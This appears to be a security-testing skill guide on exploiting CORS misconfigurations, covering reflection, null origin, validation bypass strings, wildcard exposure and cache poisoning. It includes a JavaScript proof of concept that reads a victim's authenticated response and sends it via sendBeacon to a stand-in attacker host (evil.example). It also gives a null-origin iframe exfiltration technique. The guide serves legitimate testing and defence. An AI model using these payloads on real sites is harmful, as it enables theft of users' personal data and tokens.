---
name: cors-misconfiguration
description: CORS misconfiguration testing for cross-origin theft of authenticated data via ACAO reflection, null origin, and weak origin validation
---

# CORS Misconfiguration

Cross-Origin Resource Sharing misconfigurations let a malicious site read authenticated responses from a victim's session. This is distinct from CSRF: CSRF abuses ambient authority to *send* state-changing requests, while broken CORS lets the attacker *read* the cross-origin response (PII, tokens, CSRF tokens, API keys). The dangerous combination is a reflected or overly-trusting `Access-Control-Allow-Origin` together with `Access-Control-Allow-Credentials: true`.

## Attack Surface

**Credentialed APIs**
- Cookie- or HTTP-auth-backed JSON/REST and GraphQL endpoints that return user data

**Response Headers**
- `Access-Control-Allow-Origin` (ACAO), `Access-Control-Allow-Credentials` (ACAC)
- `Access-Control-Allow-Methods/Headers`, `Access-Control-Expose-Headers`

**Token-in-Body/Header APIs**
- Endpoints returning bearer tokens, API keys, or CSRF tokens where `ACAO: *` still exposes data to any origin

## High-Value Targets

- `/api/me`, `/account`, `/profile`, session and settings endpoints
- Endpoints returning CSRF tokens, bearer tokens, or API keys
- Internal admin dashboards trusting `*.corp` or `localhost` origins
- OAuth/OIDC userinfo and token introspection endpoints
- GraphQL endpoints reachable via GET

## Reconnaissance

### What to Send

- Add an `Origin:` header to every authenticated request and inspect the response ACAO/ACAC
- Test with a clearly external origin: `Origin: https://evil.example`
- Test `Origin: null`
- Test a subdomain: `Origin: https://attacker.target.com`
- Compare responses with and without the `Origin` header to detect reflection

### Signals of Weakness

- ACAO exactly reflects the arbitrary `Origin` you sent
- `ACAO: null` is returned
- `ACAC: true` present alongside a reflected or wildcard-ish ACAO
- ACAO derived from `Origin` via substring/regex rather than an exact allowlist
- `Vary: Origin` is missing from a response that reflects the `Origin` (the CORS-permissive response is cacheable and can be served to other origins)

## Key Vulnerabilities

### Origin Reflection + Credentials

- Server copies the request `Origin` into ACAO and sets `ACAC: true`
- Any attacker origin can `fetch(..., {credentials:'include'})` and read the response
- Highest severity: full cross-origin theft of authenticated data

### Null Origin Trust

- `ACAO: null` with `ACAC: true`
- The `null` origin is produced by sandboxed iframes, `data:`/`file:` documents, and some redirects
- Exploit: `<iframe sandbox="allow-scripts allow-forms" srcdoc="...fetch...">` sends `Origin: null`

### Weak Origin Validation

**Common broken checks (all bypassable):**
- Suffix match `endsWith("target.com")` → `attackertarget.com`
- Prefix match `startsWith("https://target.com")` → `https://target.com.evil.com`
- Substring/`includes("target.com")` → `https://target.com.evil.com`, `https://eviltarget.com`
- Unanchored regex `/target\.com/` → matches `nottarget.com.evil.com`
- Trailing dot / case / IDN drift: `target.com.`, `TARGET.com`
- Special chars some parsers accept: `https://target.com%60.evil.com`, `https://target.com_.evil.com`

### Wildcard Exposure

- `ACAO: *` blocks credentialed reads in browsers, **but** still exposes any data returned without cookies (e.g., token echoed in the body or a header) to every origin
- `ACAO: *` with `Expose-Headers` leaking sensitive headers

### Missing `Vary: Origin` (Cross-Origin Cache Poisoning)

- Server reflects the request `Origin` into ACAO but omits `Vary: Origin` from the response
- A CDN or reverse-proxy cache stores the CORS-permissive response *without* keying on `Origin`, then serves it to **other** origins — granting arbitrary-origin reads even where the server would reject that `Origin` directly
- Distinct from raw reflection: the permissive `ACAO` is replayed from cache to an origin the server never approved; impact does not require the victim to control the reflected request
- Exploit: warm the cache from an allowed origin, then trigger a cached hit from an attacker origin and read the `ACAO`-bearing response

### Trusted-Origin Compromise

- Whitelisted third-party or sibling subdomain with XSS/subdomain takeover becomes a CORS pivot
- Any XSS on an allowlisted `*.target.com` grants cross-origin read of the credentialed API

## Exploitation Scenarios

### Authenticated Data Theft (Reflection + Credentials)

1. Victim is logged in to `target.com`
2. Victim visits attacker page which runs:
   ```js
   fetch('https://api.target.com/me', { credentials: 'include' })
     .then(r => r.text())
     .then(d => navigator.sendBeacon('https://evil.example/x', d));
   ```
3. Browser sends cookies; server reflects `Origin: https://evil.example` with `ACAC: true`; attacker reads PII/tokens

### Null-Origin Exfiltration

1. Attacker hosts a sandboxed iframe that emits `Origin: null`
2. The iframe fetches the credentialed endpoint and posts the response out
3. Confirms `ACAO: null` + `ACAC: true` is exploitable

### CSRF Token Theft → Chaining

1. Read a state-changing endpoint's CSRF token cross-origin via the misconfig
2. Use the stolen token to complete an otherwise-protected CSRF action

## Testing Methodology

1. **Enumerate credentialed endpoints** returning sensitive data
2. **Reflect probe** - send `Origin: https://evil.example`; check for exact reflection + `ACAC: true`
3. **Null probe** - send `Origin: null`; check ACAO/ACAC
4. **Validation-bypass matrix** - prefix, suffix, substring, unanchored regex, trailing dot, `%60`/`_` variants, sibling subdomains
5. **Wildcard review** - for `ACAO: *`, confirm whether the body/headers leak secrets even without cookies
6. **Cache-poisoning probe** - when reflection is confirmed, check for `Vary: Origin`; if absent and the response is cacheable, warm the cache from an allowed origin and replay from a second origin to confirm the permissive `ACAO` is served cross-origin
7. **Prove readability** - build a real cross-origin PoC and read the response body

## Validation

1. Host an attacker-origin PoC that performs `fetch(target, {credentials:'include'})` and captures the response body
2. Show the response includes authenticated data (session-scoped fields, tokens, PII)
3. Capture the raw response headers proving `ACAO` reflects the attacker origin (or `null`) and `ACAC: true`
4. For wildcard cases, demonstrate a no-cookie request from an arbitrary origin still reads sensitive data

## False Positives

- `ACAO: *` on endpoints returning only public, non-authenticated data with no secrets in body/headers
- Static exact allowlist of known origins with no reflection and no credentials
- Reflection present but `ACAC` absent **and** the endpoint exposes nothing sensitive without cookies — but note that reflection without `Vary: Origin` is **not** automatically safe: a shared cache can replay the permissive `ACAO` to other origins (cache poisoning), so verify caching behavior before dismissing it
- Preflight allowed but the actual response body carries no session-scoped data

## Impact

- Cross-origin theft of authenticated data: PII, session data, bearer tokens, API keys
- CSRF-token exfiltration enabling downstream state-changing attacks
- Internal/admin data exposure when internal origins or `localhost` are trusted
- Account takeover when tokens or credentials are readable cross-origin

## Pro Tips

1. Always test `ACAC: true` together with reflection — reflection alone without credentials is usually low impact
2. Try `null` early; it is a frequently-forgotten trusted origin
3. Attack the validator, not just the happy path: prefix/suffix/substring/regex variants expose the real logic
4. Sibling subdomains and allowlisted third parties are prime pivots — check them for XSS/takeover
5. For `ACAO: *`, focus on whatever the body leaks without cookies (tokens echoed in JSON are readable by anyone)
6. Diff responses with and without `Origin` to confirm the header is dynamically generated
7. Confirm real browser readability with a hosted PoC — a reflected header is not proof of exploitability until the response is read cross-origin

## Summary

Broken CORS turns any attacker page into a reader of the victim's authenticated responses. The critical pattern is a reflected or loosely-validated `Access-Control-Allow-Origin` paired with `Access-Control-Allow-Credentials: true`. Validate origins against an exact allowlist, never reflect arbitrary origins, avoid trusting `null`, and never combine wildcards or credentials with sensitive data.
